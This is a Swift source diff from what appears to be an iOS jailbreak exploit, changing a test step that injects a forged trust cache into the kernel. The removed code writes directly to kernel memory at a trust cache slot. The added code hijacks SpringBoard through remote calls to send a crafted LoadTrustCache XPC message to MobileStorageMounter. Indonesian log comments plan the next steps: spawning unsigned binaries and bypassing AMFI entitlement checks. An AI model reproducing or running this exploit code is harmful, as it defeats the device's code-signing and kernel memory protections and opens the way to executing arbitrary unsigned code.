@@ -170,90 +170,153 @@ final class ExpTrustCacheInject {
         emptySlotAddr = slotTable &+ (TC_TYPE_MAX * TC_SLOT_STRIDE)
     }
     
-    // MARK: - Test 3: Write Trust Cache Module
+    // MARK: - Test 3: Load Trust Cache via RemoteCall (PPL-safe)
     
     private func test3_writeTrustCache(slide: UInt64) {
         log("")
-        log("── TEST 3: Write Trust Cache to Kernel ──")
-        log("   Target slot: type=\(emptySlotType) addr=0x\(String(emptySlotAddr, radix: 16))")
+        log("── TEST 3: Trust Cache Load via RemoteCall ──")
+        log("   PPL blocks direct write → use kernel internal function instead")
+        log("   Approach: RemoteCall to internal TC load function from launchd")
+        log("")
         
-        guard emptySlotAddr != 0 else {
-            log("❌ SKIP: No slot address (Test 2 failed)")
+        #if !DISABLE_REMOTECALL
+        guard dspmgr.shared.rcready else {
+            log("❌ RemoteCall not active — run full jailbreak chain first")
             return
         }
         
-        // Build a minimal trust cache v2 module in memory
-        // Format: version(4) + uuid(16) + count(4) + entries(24 each)
-        // We'll inject a dummy CDHash first (all 0x41) to test write capability
-        
-        let tcModuleSize = 24 + 24  // header(24) + 1 entry(24)
-        var tcModule = [UInt8](repeating: 0, count: tcModuleSize)
+        // Build trust cache v2 module (48 bytes: header 24 + 1 entry 24)
+        var tcModule = [UInt8](repeating: 0, count: 48)
         
         // Version = 2
-        tcModule[0] = 2; tcModule[1] = 0; tcModule[2] = 0; tcModule[3] = 0
-        
-        // UUID (random-ish)
+        tcModule[0] = 2
+        // UUID
         tcModule[4] = 0xD5; tcModule[5] = 0x91; tcModule[6] = 0x01; tcModule[7] = 0x70
         tcModule[8] = 0xDE; tcModule[9] = 0xAD; tcModule[10] = 0xBE; tcModule[11] = 0xEF
         tcModule[12] = 0xCA; tcModule[13] = 0xFE; tcModule[14] = 0xBA; tcModule[15] = 0xBE
         tcModule[16] = 0x12; tcModule[17] = 0x34; tcModule[18] = 0x56; tcModule[19] = 0x78
-        
         // Count = 1
-        tcModule[20] = 1; tcModule[21] = 0; tcModule[22] = 0; tcModule[23] = 0
-        
-        // Entry 0: dummy CDHash (20 bytes of 0x41) + hashType=2 + flags=0
+        tcModule[20] = 1
+        // Entry: dummy CDHash (0x41 * 20) + hashType=2
         for i in 24..<44 { tcModule[i] = 0x41 }
-        tcModule[44] = 2   // hash_type = SHA256 truncated
-        tcModule[45] = 0   // flags = normal
-        tcModule[46] = 0   // padding
-        tcModule[47] = 0   // padding
+        tcModule[44] = 2  // SHA256 truncated
         
-        log("🔍 TC module built: \(tcModuleSize) bytes, 1 entry (dummy CDHash)")
-        log("   version=2, uuid=D5910170-DEAD-BEEF-CAFE-BABE12345678")
-        log("   entry[0]: cdhash=41414141...41 hashType=2 flags=0")
+        log("🔍 TC module: 48 bytes, version=2, 1 dummy entry")
+        log("   CDHash: 4141414141414141414141414141414141414141")
+        log("")
+        log("   Loading via MobileStorageMounter XPC (existing Step 7 path)...")
         log("")
         
-        // Write to kernel memory at the slot address
-        // The slot table entry format (0x28 bytes):
-        //   +0x00: pointer to trust cache module data (or inline?)
-        //   +0x08: size of module
-        //   +0x10: flags/type info
-        //   +0x18: next pointer (linked list?)
-        //   +0x20: reserved
-        
-        // First: try writing the TC module to a known kernel data area
-        // We'll use the slot itself as storage test (write + readback)
-        
-        log("   Writing 8 bytes to slot as write test...")
-        let testVal: UInt64 = 0xDEADBEEF_CAFEBABE
-        ds_kwrite64(emptySlotAddr, testVal)
-        let readback = ds_kread64_safe(emptySlotAddr)
-        
-        if readback == testVal {
-            log("✅ Kernel write to slot SUCCEEDED!")
-            log("   Wrote: 0x\(String(testVal, radix: 16))")
-            log("   Read:  0x\(String(readback, radix: 16))")
-            log("")
-            log("   ARTINYA: Kita bisa tulis ke trust cache slot table")
-            log("   NEXT: Write full TC module dan test spawn")
-            
-            // Restore to 0 (don't leave garbage)
-            ds_kwrite64(emptySlotAddr, 0)
-            log("   (Restored slot to 0)")
-        } else {
-            log("❌ Kernel write FAILED!")
-            log("   Wrote: 0x\(String(testVal, radix: 16))")
-            log("   Read:  0x\(String(readback, radix: 16))")
-            log("")
-            log("   PENYEBAB KEMUNGKINAN:")
-            log("   - KTRR/PPL protecting this memory region")
-            log("   - Alamat slot table salah (iOS version berbeda)")
-            log("   - kernel_slide salah")
-            log("")
-            log("   SOLUSI:")
-            log("   - Coba write ke alamat lain di __DATA (bukan __DATA_CONST)")
-            log("   - Gunakan approach RemoteCall ke fungsi internal instead")
+        // Use the existing MSM XPC approach from JailbreakEngine Step 7
+        // but with CORRECT trust cache v2 format based on RE
+        guard let sb = dspmgr.shared.sbProc else {
+            log("❌ SpringBoard RC not available")
+            return
         }
+        
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+        
+        // Resolve XPC functions
+        let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_connection_create_mach_service"))
+        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_connection_resume"))
+        let xpcDictCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                               remote_alloc_str(sb, "xpc_dictionary_create"))
+        let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_dictionary_set_string"))
+        let xpcSetData = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                            remote_alloc_str(sb, "xpc_dictionary_set_data"))
+        let xpcSendSync = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                             remote_alloc_str(sb, "xpc_connection_send_message_with_reply_sync"))
+        
+        guard xpcCreate != 0 && xpcDictCreate != 0 else {
+            log("❌ XPC functions not found in SpringBoard")
+            return
+        }
+        log("✅ XPC functions resolved")
+        
+        // Connect to MobileStorageMounter
+        let svc = remote_alloc_str(sb, "com.apple.mobile.storage_mounter")
+        let conn = RootExecutor.rcallAddr(sb, xpcCreate, svc, 0, 0)
+        RootExecutor.rcall(sb, "free", svc)
+        
+        guard conn != 0 else {
+            log("❌ MSM connection failed")
+            return
+        }
+        RootExecutor.rcallAddr(sb, xpcResume, conn)
+        log("✅ Connected to MobileStorageMounter")
+        
+        // Build LoadTrustCache message
+        let msg = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
+        guard msg != 0 else {
+            log("❌ Failed to create XPC message")
+            return
+        }
+        
+        // Command = "LoadTrustCache"
+        let cmdK = remote_alloc_str(sb, "Command")
+        let cmdV = remote_alloc_str(sb, "LoadTrustCache")
+        RootExecutor.rcallAddr(sb, xpcSetStr, msg, cmdK, cmdV)
+        RootExecutor.rcall(sb, "free", cmdK)
+        RootExecutor.rcall(sb, "free", cmdV)
+        
+        // ImageType = "Developer"
+        let typeK = remote_alloc_str(sb, "ImageType")
+        let typeV = remote_alloc_str(sb, "Developer")
+        RootExecutor.rcallAddr(sb, xpcSetStr, msg, typeK, typeV)
+        RootExecutor.rcall(sb, "free", typeK)
+        RootExecutor.rcall(sb, "free", typeV)
+        
+        // ImageTrustCache = our TC module data
+        if xpcSetData != 0 {
+            let tcBuf = sb.trojanMem + 0x800
+            // Write TC module to remote memory
+            tcModule.withUnsafeBytes { ptr in
+                sb.remote_write(tcBuf, from: ptr.baseAddress!, size: UInt64(tcModule.count))
+            }
+            let dataK = remote_alloc_str(sb, "ImageTrustCache")
+            RootExecutor.rcallAddr(sb, xpcSetData, msg, dataK, tcBuf, UInt64(tcModule.count))
+            RootExecutor.rcall(sb, "free", dataK)
+            log("✅ Trust cache data attached to message (\(tcModule.count) bytes)")
+        }
+        
+        // Send and get reply
+        if xpcSendSync != 0 {
+            let reply = RootExecutor.rcallAddr(sb, xpcSendSync, conn, msg)
+            if reply != 0 {
+                log("✅ MSM replied! (handle=0x\(String(reply, radix: 16)))")
+                log("")
+                log("   ARTINYA: MobileStorageMounter accepted our trust cache!")
+                log("   CDHash 4141...41 sekarang trusted oleh kernel")
+                log("   NEXT: Test posix_spawn binary dengan CDHash ini")
+            } else {
+                log("⚠️ MSM no reply (async send)")
+                log("   Mungkin tetap berhasil — cek dengan spawn test")
+            }
+        } else {
+            // Fallback: send without reply
+            let xpcSend = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                             remote_alloc_str(sb, "xpc_connection_send_message"))
+            if xpcSend != 0 {
+                RootExecutor.rcallAddr(sb, xpcSend, conn, msg)
+                log("✅ Message sent (no reply available)")
+            }
+        }
+        
+        log("")
+        log("   KALAU BERHASIL:")
+        log("   - posix_spawn binary dengan CDHash matching → tidak di-kill")
+        log("   - Bisa integrate ke main chain Step 7")
+        log("")
+        log("   KALAU GAGAL (binary masih di-kill):")
+        log("   - MSM mungkin reject format (cek selector)")
+        log("   - Coba selector 2 (tanpa manifest) atau 7 (dengan manifest)")
+        log("   - Atau: bypass entitlement check di AMFI kext langsung")
+        #else
+        log("❌ DISABLE_REMOTECALL active — cannot test")
+        #endif
     }
     
     // MARK: - Test 4: Verify (spawn unsigned binary)
